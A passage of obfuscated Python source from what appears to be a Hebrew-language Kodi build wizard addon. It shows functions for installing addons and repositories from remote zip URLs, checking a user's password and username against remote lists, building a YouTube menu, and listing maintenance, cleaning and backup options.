		else :#line:2514
			wiz .log ("[Addon Menu] ERROR: URL for Addon list not working.")#line:2515
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2516
			addFile ('%s'%O0OO0OOOOO00O0OO0 ,'',themeit =THEME3 )#line:2517
	else :wiz .log ("[Addon Menu] No Addon list added.")#line:2518
	setView ('files','viewType')#line:2519
def addonInstaller (O00O00OOOO000O0O0 ,OO00OOOOO00O0OOO0 ):#line:2521
	if not ADDONFILE =='http://':#line:2522
		OOOO0OOOOOOOO0O00 =wiz .workingURL (OO00OOOOO00O0OOO0 )#line:2523
		if OOOO0OOOOOOOO0O00 ==True :#line:2524
			OO00OOOOO0OO0OOO0 =wiz .openURL (OO00OOOOO00O0OOO0 ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('repository=""','repository="none"').replace ('repositoryurl=""','repositoryurl="http://"').replace ('repositoryxml=""','repositoryxml="http://"')#line:2525
			O0OO000OOO0OOO0O0 =re .compile ('name="(.+?)".+?lugin="%s".+?rl="(.+?)".+?epository="(.+?)".+?epositoryxml="(.+?)".+?epositoryurl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"'%O00O00OOOO000O0O0 ).findall (OO00OOOOO0OO0OOO0 )#line:2526
			if len (O0OO000OOO0OOO0O0 )>0 :#line:2527
				for OOO0OO0OOOO00OOO0 ,OO00OOOOO00O0OOO0 ,O0OO0OO0OOOO0O000 ,OO0O0O0OO0000O00O ,OO00O00O000000OO0 ,OOOO000O0OO0O0O0O ,O00OOO0O0OO0O000O ,OOOOO00000000000O ,OO0O0OO00OOOOO0OO in O0OO000OOO0OOO0O0 :#line:2528
					if os .path .exists (os .path .join (ADDONS ,O00O00OOOO000O0O0 )):#line:2529
						O00OOOOOOOO0O000O =['Launch Addon','Remove Addon']#line:2530
						O00000000OOO00OO0 =DIALOG .select ("[COLOR %s]Addon already installed what would you like to do?[/COLOR]"%COLOR2 ,O00OOOOOOOO0O000O )#line:2531
						if O00000000OOO00OO0 ==0 :#line:2532
							wiz .ebi ('RunAddon(%s)'%O00O00OOOO000O0O0 )#line:2533
							xbmc .sleep (1000 )#line:2534
							return True #line:2535
						elif O00000000OOO00OO0 ==1 :#line:2536
							wiz .cleanHouse (os .path .join (ADDONS ,O00O00OOOO000O0O0 ))#line:2537
							try :wiz .removeFolder (os .path .join (ADDONS ,O00O00OOOO000O0O0 ))#line:2538
							except :pass #line:2539
							if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to remove the addon_data for:"%COLOR2 ,"[COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR1 ,O00O00OOOO000O0O0 ),yeslabel ="[B][COLOR green]Yes Remove[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):#line:2540
								removeAddonData (O00O00OOOO000O0O0 )#line:2541
							wiz .refresh ()#line:2542
							return True #line:2543
						else :#line:2544
							return False #line:2545
					OO0O000OO00OOO000 =os .path .join (ADDONS ,O0OO0OO0OOOO0O000 )#line:2546
					if not O0OO0OO0OOOO0O000 .lower ()=='none'and not os .path .exists (OO0O000OO00OOO000 ):#line:2547
						wiz .log ("Repository not installed, installing it")#line:2548
						if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to install the repository for [COLOR %s]%s[/COLOR]:"%(COLOR2 ,COLOR1 ,O00O00OOOO000O0O0 ),"[COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR1 ,O0OO0OO0OOOO0O000 ),yeslabel ="[B][COLOR green]Yes Install[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):#line:2549
							OO0O0OO00000O0OO0 =wiz .parseDOM (wiz .openURL (OO0O0O0OO0000O00O ),'addon',ret ='version',attrs ={'id':O0OO0OO0OOOO0O000 })#line:2550
							if len (OO0O0OO00000O0OO0 )>0 :#line:2551
								OO0OO00000OO00OO0 ='%s%s-%s.zip'%(OO00O00O000000OO0 ,O0OO0OO0OOOO0O000 ,OO0O0OO00000O0OO0 [0 ])#line:2552
								wiz .log (OO0OO00000OO00OO0 )#line:2553
								if KODIV >=17 :wiz .addonDatabase (O0OO0OO0OOOO0O000 ,1 )#line:2554
								installAddon (O0OO0OO0OOOO0O000 ,OO0OO00000OO00OO0 )#line:2555
								wiz .ebi ('UpdateAddonRepos()')#line:2556
								wiz .log ("Installing Addon from Kodi")#line:2558
								O00OOOOO0O0OOO00O =installFromKodi (O00O00OOOO000O0O0 )#line:2559
								wiz .log ("Install from Kodi: %s"%O00OOOOO0O0OOO00O )#line:2560
								if O00OOOOO0O0OOO00O :#line:2561
									wiz .refresh ()#line:2562
									return True #line:2563
							else :#line:2564
								wiz .log ("[Addon Installer] Repository not installed: Unable to grab url! (%s)"%O0OO0OO0OOOO0O000 )#line:2565
						else :wiz .log ("[Addon Installer] Repository for %s not installed: %s"%(O00O00OOOO000O0O0 ,O0OO0OO0OOOO0O000 ))#line:2566
					elif O0OO0OO0OOOO0O000 .lower ()=='none':#line:2567
						wiz .log ("No repository, installing addon")#line:2568
						OO000OO00000O0O00 =O00O00OOOO000O0O0 #line:2569
						O0OO00000000OO0O0 =OO00OOOOO00O0OOO0 #line:2570
						installAddon (O00O00OOOO000O0O0 ,OO00OOOOO00O0OOO0 )#line:2571
						wiz .refresh ()#line:2572
						return True #line:2573
					else :#line:2574
						wiz .log ("Repository installed, installing addon")#line:2575
						O00OOOOO0O0OOO00O =installFromKodi (O00O00OOOO000O0O0 ,False )#line:2576
						if O00OOOOO0O0OOO00O :#line:2577
							wiz .refresh ()#line:2578
							return True #line:2579
					if os .path .exists (os .path .join (ADDONS ,O00O00OOOO000O0O0 )):return True #line:2580
					O00O00O0O0O000O00 =wiz .parseDOM (wiz .openURL (OO0O0O0OO0000O00O ),'addon',ret ='version',attrs ={'id':O00O00OOOO000O0O0 })#line:2581
					if len (O00O00O0O0O000O00 )>0 :#line:2582
						OO00OOOOO00O0OOO0 ="%s%s-%s.zip"%(OO00OOOOO00O0OOO0 ,O00O00OOOO000O0O0 ,O00O00O0O0O000O00 [0 ])#line:2583
						wiz .log (str (OO00OOOOO00O0OOO0 ))#line:2584
						if KODIV >=17 :wiz .addonDatabase (O00O00OOOO000O0O0 ,1 )#line:2585
						installAddon (O00O00OOOO000O0O0 ,OO00OOOOO00O0OOO0 )#line:2586
						wiz .refresh ()#line:2587
					else :#line:2588
						wiz .log ("no match");return False #line:2589
			else :wiz .log ("[Addon Installer] Invalid Format")#line:2590
		else :wiz .log ("[Addon Installer] Text File: %s"%OOOO0OOOOOOOO0O00 )#line:2591
	else :wiz .log ("[Addon Installer] Not Enabled.")#line:2592
def installFromKodi (OOO0OOOO0O0O0OOOO ,over =True ):#line:2594
	if over ==True :#line:2595
		xbmc .sleep (2000 )#line:2596
	wiz .ebi ('RunPlugin(plugin://%s)'%OOO0OOOO0O0O0OOOO )#line:2598
	if not wiz .whileWindow ('yesnodialog'):#line:2599
		return False #line:2600
	xbmc .sleep (1000 )#line:2601
	if wiz .whileWindow ('okdialog'):#line:2602
		return False #line:2603
	wiz .whileWindow ('progressdialog')#line:2604
	if os .path .exists (os .path .join (ADDONS ,OOO0OOOO0O0O0OOOO )):return True #line:2605
	else :return False #line:2606
def installAddon (O0OO0O00OO0OOO000 ,O0OO0OO0OO0O00000 ):#line:2608
	if not wiz .workingURL (O0OO0OO0OO0O00000 )==True :wiz .LogNotify ("[COLOR %s]Addon Installer[/COLOR]"%COLOR1 ,'[COLOR %s]%s:[/COLOR] [COLOR %s]קישור זיפ לא תקין![/COLOR]'%(COLOR1 ,O0OO0O00OO0OOO000 ,COLOR2 ));return #line:2609
	if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:2610
	DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0OO0O00OO0OOO000 ),'','[COLOR %s]אנא המתן[/COLOR]'%COLOR2 )#line:2611
	O0OOO0O00O000OO0O =O0OO0OO0OO0O00000 .split ('/')#line:2612
	OOO00OO00O0O0O00O =os .path .join (PACKAGES ,O0OOO0O00O000OO0O [-1 ])#line:2613
	try :os .remove (OOO00OO00O0O0O00O )#line:2614
	except :pass #line:2615
	downloader .download (O0OO0OO0OO0O00000 ,OOO00OO00O0O0O00O ,DP )#line:2616
	O00000OO0OO0OO0OO ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0OO0O00OO0OOO000 )#line:2617
	DP .update (0 ,O00000OO0OO0OO0OO ,'','[COLOR %s]אנא המתן[/COLOR]'%COLOR2 )#line:2618
	OOOOO00OO0O0OO0O0 ,OO00000000OO0O0O0 ,OO00OOO0OOO00OO0O =extract .all (OOO00OO00O0O0O00O ,ADDONS ,DP ,title =O00000OO0OO0OO0OO )#line:2619
	DP .update (0 ,O00000OO0OO0OO0OO ,'','[COLOR %s]מתקין תלויות[/COLOR]'%COLOR2 )#line:2620
	installed (O0OO0O00OO0OOO000 )#line:2621
	installDep (O0OO0O00OO0OOO000 ,DP )#line:2622
	DP .close ()#line:2623
	wiz .ebi ('UpdateAddonRepos()')#line:2624
	wiz .ebi ('UpdateLocalAddons()')#line:2625
	wiz .refresh ()#line:2626
def installDep (O00OOO0OOOOO000O0 ,DP =None ):#line:2628
	O0OOOOOOOO0O0O0O0 =os .path .join (ADDONS ,O00OOO0OOOOO000O0 ,'addon.xml')#line:2629
	if os .path .exists (O0OOOOOOOO0O0O0O0 ):#line:2630
		O00O0OOOO000OOO0O =open (O0OOOOOOOO0O0O0O0 ,mode ='r');OO0OOOO0OOOO0OO00 =O00O0OOOO000OOO0O .read ();O00O0OOOO000OOO0O .close ();#line:2631
		O00000OO0O000OOO0 =wiz .parseDOM (OO0OOOO0OOOO0OO00 ,'import',ret ='addon')#line:2632
		for O0O00O0000O00OOO0 in O00000OO0O000OOO0 :#line:2633
			if not 'xbmc.python'in O0O00O0000O00OOO0 :#line:2634
				if not DP ==None :#line:2635
					DP .update (0 ,'','[COLOR %s]%s[/COLOR]'%(COLOR1 ,O0O00O0000O00OOO0 ))#line:2636
				wiz .createTemp (O0O00O0000O00OOO0 )#line:2637
def installed (OO0OOOOO00O000OO0 ):#line:2664
	O0OOOO0OO000O0OOO =os .path .join (ADDONS ,OO0OOOOO00O000OO0 ,'addon.xml')#line:2665
	if os .path .exists (O0OOOO0OO000O0OOO ):#line:2666
		try :#line:2667
			OO0O000OOOOO00OOO =open (O0OOOO0OO000O0OOO ,mode ='r');O0O00000O00O0OO00 =OO0O000OOOOO00OOO .read ();OO0O000OOOOO00OOO .close ()#line:2668
			OO0OOOOO0O0O00O0O =wiz .parseDOM (O0O00000O00O0OO00 ,'addon',ret ='name',attrs ={'id':OO0OOOOO00O000OO0 })#line:2669
			O00OO0OOO0OO00OOO =os .path .join (ADDONS ,OO0OOOOO00O000OO0 ,'icon.png')#line:2670
			wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,OO0OOOOO0O0O00O0O [0 ]),'[COLOR %s]מאפשר הרחבות[/COLOR]'%COLOR2 ,'2000',O00OO0OOO0OO00OOO )#line:2671
		except :pass #line:2672
def youtubeMenu (url =None ):#line:2674
	if not YOUTUBEFILE =='http://':#line:2675
		if url ==None :#line:2676
			O000O0000000000OO =wiz .workingURL (YOUTUBEFILE )#line:2677
			O000O00O00O0O0O00 =uservar .YOUTUBEFILE #line:2678
		else :#line:2679
			O000O0000000000OO =wiz .workingURL (url )#line:2680
			O000O00O00O0O0O00 =url #line:2681
		if O000O0000000000OO ==True :#line:2682
			O0O00000000O00O00 =wiz .openURL (O000O00O00O0O0O00 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2683
			OO0000000O0O0O00O =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (O0O00000000O00O00 )#line:2684
			if len (OO0000000O0O0O00O )>0 :#line:2685
				for O0OOO0O0OO00O00OO ,OOOOO00O0O0OO00OO ,url ,OOO0OO0OO0O000OO0 ,O0OOO0O000O00OOO0 ,O000O0O00OOOO0O0O in OO0000000O0O0O00O :#line:2686
					if OOOOO00O0O0OO00OO .lower ()=="yes":#line:2687
						addDir ("[B]%s[/B]"%O0OOO0O0OO00O00OO ,'youtube',url ,description =O000O0O00OOOO0O0O ,icon =OOO0OO0OO0O000OO0 ,fanart =O0OOO0O000O00OOO0 ,themeit =THEME3 )#line:2688
					else :#line:2689
						addFile (O0OOO0O0OO00O00OO ,'viewVideo',url =url ,description =O000O0O00OOOO0O0O ,icon =OOO0OO0OO0O000OO0 ,fanart =O0OOO0O000O00OOO0 ,themeit =THEME2 )#line:2690
			else :wiz .log ("[YouTube Menu] ERROR: Invalid Format.")#line:2691
		else :#line:2692
			wiz .log ("[YouTube Menu] ERROR: URL for YouTube list not working.")#line:2693
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2694
			addFile ('%s'%O000O0000000000OO ,'',themeit =THEME3 )#line:2695
	else :wiz .log ("[YouTube Menu] No YouTube list added.")#line:2696
	setView ('files','viewType')#line:2697
def STARTP ():#line:2698
	O0O0000OO0O0OO000 =(ADDON .getSetting ("pass"))#line:2699
	if BUILDNAME =="":#line:2700
	 if not NOTIFY =='true':#line:2701
          O0OO00OOOOO00OOOO =wiz .workingURL (NOTIFICATION )#line:2702
	 if not NOTIFY2 =='true':#line:2703
          O0OO00OOOOO00OOOO =wiz .workingURL (NOTIFICATION2 )#line:2704
	 if not NOTIFY3 =='true':#line:2705
          O0OO00OOOOO00OOOO =wiz .workingURL (NOTIFICATION3 )#line:2706
	O0OO00O0O0OOO00O0 =O0O0000OO0O0OO000 #line:2707
	O0OO00OOOOO00OOOO =urllib2 .Request (SPEED )#line:2708
	OO0O0O0O0OO00O0OO =urllib2 .urlopen (O0OO00OOOOO00OOOO )#line:2709
	O0O00OO00OOO0O000 =OO0O0O0O0OO00O0OO .readlines ()#line:2711
	OOOOOO0O0O00OO00O =0 #line:2715
	for O0O00O00OOOO0O00O in O0O00OO00OOO0O000 :#line:2716
		if O0O00O00OOOO0O00O .split (' ==')[0 ]==O0O0000OO0O0OO000 or O0O00O00OOOO0O00O .split ()[0 ]==O0O0000OO0O0OO000 :#line:2717
			OOOOOO0O0O00OO00O =1 #line:2718
			break #line:2719
	if OOOOOO0O0O00OO00O ==0 :#line:2720
					O0OO000000OOOOOO0 =DIALOG .yesno ("%s"%ADDONTITLE ,"[COLOR %s]הסיסמה אינה נכונה,"%(COLOR2 ),"הכנס את הסיסמה כעת[/COLOR]",nolabel ='[B][COLOR white]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]אישור[/COLOR][/B]')#line:2721
					if O0OO000000OOOOOO0 :#line:2723
						ADDON .openSettings ()#line:2725
						sys .exit ()#line:2727
					else :#line:2728
						sys .exit ()#line:2729
	return 'ok'#line:2733
def STARTP2 ():#line:2734
	O0O00OO0O0000OOOO =(ADDON .getSetting ("user"))#line:2735
	OOOO0OO0OO0O00O00 =(UNAME )#line:2737
	O00O000OOO00000OO =urllib2 .urlopen (OOOO0OO0OO0O00O00 )#line:2738
	OO000O00OO000OOO0 =O00O000OOO00000OO .readlines ()#line:2739
	OOO0O0OOO000OOO0O =0 #line:2740
	for OO0OO0O0000OO0OOO in OO000O00OO000OOO0 :#line:2743
		if OO0OO0O0000OO0OOO .split (' ==')[0 ]==O0O00OO0O0000OOOO or OO0OO0O0000OO0OOO .split ()[0 ]==O0O00OO0O0000OOOO :#line:2744
			OOO0O0OOO000OOO0O =1 #line:2745
			break #line:2746
	if OOO0O0OOO000OOO0O ==0 :#line:2747
		O0OOO0O00OO00O000 =DIALOG .yesno ("%s"%ADDONTITLE ,"[COLOR %s]שם המתשמש שהוכנס אינו נכון,"%(COLOR2 ),"הכנס את שם המשתמש כעת[/COLOR]",nolabel ='[B][COLOR white]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]אישור[/COLOR][/B]')#line:2748
		if O0OOO0O00OO00O000 :#line:2750
			ADDON .openSettings ()#line:2752
			sys .exit ()#line:2755
		else :#line:2756
			sys .exit ()#line:2757
	return 'ok'#line:2761
def passandpin ():#line:2762
	addFile ('קבל קוד אימות','getpass',name ,'getpass',themeit =THEME1 )#line:2763
	addFile ('הכנס שם משתמש','setuname',name ,'setuname',themeit =THEME1 )#line:2764
	addFile ('הכנס סיסמה','setpass',name ,'setpass',themeit =THEME1 )#line:2765
def passandUsername ():#line:2766
	ADDON .openSettings ()#line:2768
def folderback ():#line:2771
    O0OO0O0O0OO0OO0OO =ADDON .getSetting ("path")#line:2772
    if O0OO0O0O0OO0OO0OO :#line:2773
      O0OO0O0O0OO0OO0OO =xbmcgui .Dialog ().browse (0 ,"בחר תקייה",'files','',False ,False ,HOME )#line:2774
      ADDON .setSetting ("path",O0OO0O0O0OO0OO0OO )#line:2775
def backmyupbuild ():#line:2778
		addFile ('מחק את תיקיית הגיבוי שלי','clearbackup',icon =ICONMAINT ,themeit =THEME3 )#line:2782
		addFile ('[COLOR %s]%s[/COLOR]מיקום גיבוי: '%(COLOR2 ,MYBUILDS ),'folderback','Maintenance',icon =ICONMAINT ,themeit =THEME3 )#line:2783
		addFile ('גיבוי בילד שלם','backupbuild',icon =ICONMAINT ,themeit =THEME3 )#line:2784
		addFile ('גיבוי הגדרות סקין ותפריטים בלבד','backuptheme',icon =ICONMAINT ,themeit =THEME3 )#line:2786
		addFile ('גיבוי הגדרות של הרחבות כולל תפריטים וסיסמאות','backupaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2787
		addFile ('שחזור בילד שלם','restorezip',icon =ICONMAINT ,themeit =THEME3 )#line:2788
		addFile ('שחזור הגדרות','restoreaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2790
def maintMenu (view =None ):#line:2794
	OOOO000OO0O000OOO ='[B][COLOR green]ON[/COLOR][/B]';OOOOOOOOO00OOO000 ='[B][COLOR red]OFF[/COLOR][/B]'#line:2796
	OOO00O0O0O000OO00 ='true'if AUTOCLEANUP =='true'else 'false'#line:2797
	OO0OO00OO0O00O0OO ='true'if AUTOCACHE =='true'else 'false'#line:2798
	O0O000O0000O0000O ='true'if AUTOPACKAGES =='true'else 'false'#line:2799
	O0OO0O0OOO0O00O00 ='true'if AUTOTHUMBS =='true'else 'false'#line:2800
	OOO0OO00O00O0O00O ='true'if SHOWMAINT =='true'else 'false'#line:2801
	O0OO000O000O000O0 ='true'if INCLUDEVIDEO =='true'else 'false'#line:2802
	OOOO0OO000000O00O ='true'if INCLUDEALL =='true'else 'false'#line:2803
	O0OO000OOO000O0O0 ='true'if THIRDPARTY =='true'else 'false'#line:2804
	if wiz .Grab_Log (True )==False :O00OO00O0000O000O =0 #line:2805
	else :O00OO00O0000O000O =errorChecking (wiz .Grab_Log (True ),True ,True )#line:2806
	if wiz .Grab_Log (True ,True )==False :OOO0OOOO0O0OO0O0O =0 #line:2807
	else :OOO0OOOO0O0OO0O0O =errorChecking (wiz .Grab_Log (True ,True ),True ,True )#line:2808
	O0000OO0OOO0000O0 =int (O00OO00O0000O000O )+int (OOO0OOOO0O0OO0O0O )#line:2809
	OO0OOOOOO0OO0O0O0 =str (O0000OO0OOO0000O0 )+' Error(s) Found'if O0000OO0OOO0000O0 >0 else 'None Found'#line:2810
	OO0OO0OO00000OO00 =': [COLOR red]Not Found[/COLOR]'if not os .path .exists (WIZLOG )else ": [COLOR green]%s[/COLOR]"%wiz .convertSize (os .path .getsize (WIZLOG ))#line:2811
	if OOOO0OO000000O00O =='true':#line:2812
		OOO0OOO0O0O0OOO00 ='true'#line:2813
		O0O0O00OO0O0OOOOO ='true'#line:2814
		O00O0OO000O00O000 ='true'#line:2815
		O000O0000OOO0000O ='true'#line:2816
		OO000O0000O00OO00 ='true'#line:2817
		O00000O0OOO0OO0O0 ='true'#line:2818
		OOOOO000O00O000OO ='true'#line:2819
		OO000O00O0O0000OO ='true'#line:2820
	else :#line:2821
		OOO0OOO0O0O0OOO00 ='true'if INCLUDEBOB =='true'else 'false'#line:2822
		O0O0O00OO0O0OOOOO ='true'if INCLUDEPHOENIX =='true'else 'false'#line:2823
		O00O0OO000O00O000 ='true'if INCLUDESPECTO =='true'else 'false'#line:2824
		O000O0000OOO0000O ='true'if INCLUDEGENESIS =='true'else 'false'#line:2825
		OO000O0000O00OO00 ='true'if INCLUDEEXODUS =='true'else 'false'#line:2826
		O00000O0OOO0OO0O0 ='true'if INCLUDEONECHAN =='true'else 'false'#line:2827
		OOOOO000O00O000OO ='true'if INCLUDESALTS =='true'else 'false'#line:2828
		OO000O00O0O0000OO ='true'if INCLUDESALTSHD =='true'else 'false'#line:2829
	OO00O00O00OO0O000 =wiz .getSize (PACKAGES )#line:2830
	OO0O00O00O00OOO0O =wiz .getSize (THUMBS )#line:2831
	O0O0O0O0000000O0O =wiz .getCacheSize ()#line:2832
	OO00OO00OOO00O000 =OO00O00O00OO0O000 +OO0O00O00O00OOO0O +O0O0O0O0000000O0O #line:2833
	OO000O0O0OOOOOOO0 =['Daily','Always','3 Days','Weekly']#line:2834
	addDir ('[B]Cleaning Tools[/B]','maint','clean',icon =ICONMAINT ,themeit =THEME1 )#line:2835
	if view =="clean"or SHOWMAINT =='true':#line:2836
		addFile ('ניקוי מלא: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (OO00OO00OOO00O000 ),'fullclean',icon =ICONMAINT ,themeit =THEME3 )#line:2837
		addFile ('ניקוי קאש: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (O0O0O0O0000000O0O ),'clearcache',icon =ICONMAINT ,themeit =THEME3 )#line:2838
		addFile ('ניקוי חבילות: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (OO00O00O00OO0O000 ),'clearpackages',icon =ICONMAINT ,themeit =THEME3 )#line:2839
		addFile ('ניקוי תמונות: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (OO0O00O00O00OOO0O ),'clearthumb',icon =ICONMAINT ,themeit =THEME3 )#line:2840
		addFile ('ניקוי תמונות ישנות','oldThumbs',icon =ICONMAINT ,themeit =THEME3 )#line:2841
		addFile ('ניקוי קאש לוג','clearcrash',icon =ICONMAINT ,themeit =THEME3 )#line:2842
		addFile ('ניקוי חבילות ישנות','purgedb',icon =ICONMAINT ,themeit =THEME3 )#line:2843
		addFile ('התקנה נקיה','freshstart',icon =ICONMAINT ,themeit =THEME3 )#line:2844
	addDir ('[B]Addon Tools[/B]','maint','addon',icon =ICONMAINT ,themeit =THEME1 )#line:2845
	if view =="addon"or SHOWMAINT =='false':#line:2846
		addFile ('הסרת הרחבות','removeaddons',icon =ICONMAINT ,themeit =THEME3 )#line:2847
		addDir ('הסרת מידע הרחבות','removeaddondata',icon =ICONMAINT ,themeit =THEME3 )#line:2848
		addDir ('הפעלה או ביטול הרחבות','enableaddons',icon =ICONMAINT ,themeit =THEME3 )#line:2849
		addFile ('Enable/Disable Adult Addons','toggleadult',icon =ICONMAINT ,themeit =THEME3 )#line:2850
		addFile ('בודק עדכונים','forceupdate',icon =ICONMAINT ,themeit =THEME3 )#line:2851
		addFile ('Hide Passwords On Keyboard Entry','hidepassword',icon =ICONMAINT ,themeit =THEME3 )#line:2852
		addFile ('Unhide Passwords On Keyboard Entry','unhidepassword',icon =ICONMAINT ,themeit =THEME3 )#line:2853
	addDir ('[B]Misc Maintenance[/B]','maint','misc',icon =ICONMAINT ,themeit =THEME1 )#line:2854
	if view =="misc"or SHOWMAINT =='true':#line:2855
		addFile ('Kodi 17 Fix','kodi17fix',icon =ICONMAINT ,themeit =THEME3 )#line:2856
		addFile ('Reload Skin','forceskin',icon =ICONMAINT ,themeit =THEME3 )#line:2857
		addFile ('Reload Profile','forceprofile',icon =ICONMAINT ,themeit =THEME3 )#line:2858
		addFile ('Force Close Kodi','forceclose',icon =ICONMAINT ,themeit =THEME3 )#line:2859
		addFile ('Upload Kodi.log','uploadlog',icon =ICONMAINT ,themeit =THEME3 )#line:2860
		addFile ('View Errors in Log: %s'%(OO0OOOOOO0OO0O0O0 ),'viewerrorlog',icon =ICONMAINT ,themeit =THEME3 )#line:2861
		addFile ('View Log File','viewlog',icon =ICONMAINT ,themeit =THEME3 )#line:2862
		addFile ('View Wizard Log File','viewwizlog',icon =ICONMAINT ,themeit =THEME3 )#line:2863
		addFile ('Clear Wizard Log File%s'%OO0OO0OO00000OO00 ,'clearwizlog',icon =ICONMAINT ,themeit =THEME3 )#line:2864
	addDir ('[B]שחזור וגיבוי[/B]','maint','backup',icon =ICONMAINT ,themeit =THEME1 )#line:2865
	if view =="backup"or SHOWMAINT =='true':#line:2866
		addFile ('Clean Up Back Up Folder','clearbackup',icon =ICONMAINT ,themeit =THEME3 )#line:2867
		addFile ('Back Up Location: [COLOR %s]%s[/COLOR]'%(COLOR2 ,MYBUILDS ),'settings','Maintenance',icon =ICONMAINT ,themeit =THEME3 )#line:2868
		addFile ('[גיבוי]: בילד','backupbuild',icon =ICONMAINT ,themeit =THEME3 )#line:2869
		addFile ('[גיבוי]: פרופילים','backupgui',icon =ICONMAINT ,themeit =THEME3 )#line:2870
		addFile ('[גיבוי]: סקינים','backuptheme',icon =ICONMAINT ,themeit =THEME3 )#line:2871
		addFile ('[גיבוי]: אדון דאטה','backupaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2872
		addFile ('[שחזור]: בילד מתיקיה מקומית','restorezip',icon =ICONMAINT ,themeit =THEME3 )#line:2873
		addFile ('[שחזור]: פרופילים מתיקיה מקומית','restoregui',icon =ICONMAINT ,themeit =THEME3 )#line:2874
		addFile ('[שחזור]: אדון דאטה מתיקיה מקומית','restoreaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2875
		addFile ('[שחזור]: בילד מתיקיה חיצונית','restoreextzip',icon =ICONMAINT ,themeit =THEME3 )#line:2876
		addFile ('[שחזור]: פרופילים מתיקיה חיצונית','restoreextgui',icon =ICONMAINT ,themeit =THEME3 )#line:2877
		addFile ('[שחזור]: אדון דאטה מתיקיה חיצונית','restoreextaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2878
	addDir ('[B]System Tweaks/Fixes[/B]','maint','tweaks',icon =ICONMAINT ,themeit =THEME1 )#line:2879
	if view =="tweaks"or SHOWMAINT =='true':#line:2880
		if not ADVANCEDFILE =='http://'and not ADVANCEDFILE =='':#line:2881
			addDir ('Advanced Settings','advancedsetting',icon =ICONMAINT ,themeit =THEME3 )#line:2882
		else :#line:2883
			if os .path .exists (ADVANCED ):#line:2884
				addFile ('View Currect AdvancedSettings.xml','currentsettings',icon =ICONMAINT ,themeit =THEME3 )#line:2885
				addFile ('Remove Currect AdvancedSettings.xml','removeadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2886
			addFile ('Quick Configure AdvancedSettings.xml','autoadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2887
		addFile ('Scan Sources for broken links','checksources',icon =ICONMAINT ,themeit =THEME3 )#line:2888
		addFile ('Scan For Broken Repositories','checkrepos',icon =ICONMAINT ,themeit =THEME3 )#line:2889
		addFile ('Fix Addons Not Updating','fixaddonupdate',icon =ICONMAINT ,themeit =THEME3 )#line:2890
		addFile ('Remove Non-Ascii filenames','asciicheck',icon =ICONMAINT ,themeit =THEME3 )#line:2891
		addFile ('Convert Paths to special','convertpath',icon =ICONMAINT ,themeit =THEME3 )#line:2892
		addDir ('System Information','systeminfo',icon =ICONMAINT ,themeit =THEME3 )#line:2893
	addFile ('Show All Maintenance: %s'%OOO0OO00O00O0O00O .replace ('true',OOOO000OO0O000OOO ).replace ('false',OOOOOOOOO00OOO000 ),'togglesetting','showmaint',icon =ICONMAINT ,themeit =THEME2 )#line:2894
	addDir ('[I]<< Return to Main Menu[/I]',icon =ICONMAINT ,themeit =THEME2 )#line:2895
	addFile ('Third Party Wizards: %s'%O0OO000OOO000O0O0 .replace ('true',OOOO000OO0O000OOO ).replace ('false',OOOOOOOOO00OOO000 ),'togglesetting','enable3rd',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2896
	if O0OO000OOO000O0O0 =='true':#line:2897
		O0OOO0O000OO0O00O =THIRD1NAME if not THIRD1NAME ==''else 'Not Set'#line:2898
		O00000OOO0OOOOOO0 =THIRD2NAME if not THIRD2NAME ==''else 'Not Set'#line:2899
		OO00000OOO0O0O00O =THIRD3NAME if not THIRD3NAME ==''else 'Not Set'#line:2900
		addFile ('Edit Third Party Wizard 1: [COLOR %s]%s[/COLOR]'%(COLOR2 ,O0OOO0O000OO0O00O ),'editthird','1',icon =ICONMAINT ,themeit =THEME3 )#line:2901
		addFile ('Edit Third Party Wizard 2: [COLOR %s]%s[/COLOR]'%(COLOR2 ,O00000OOO0OOOOOO0 ),'editthird','2',icon =ICONMAINT ,themeit =THEME3 )#line:2902
		addFile ('Edit Third Party Wizard 3: [COLOR %s]%s[/COLOR]'%(COLOR2 ,OO00000OOO0O0O00O ),'editthird','3',icon =ICONMAINT ,themeit =THEME3 )#line:2903
	addFile ('ניקוי אוטומטי','',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2904
	addFile ('ניקוי אוטומטי בהפעלה: %s'%OOO00O0O0O000OO00 .replace ('true',OOOO000OO0O000OOO ).replace ('false',OOOOOOOOO00OOO000 ),'togglesetting','autoclean',icon =ICONMAINT ,themeit =THEME3 )#line:2905
	if OOO00O0O0O000OO00 =='true':#line:2906
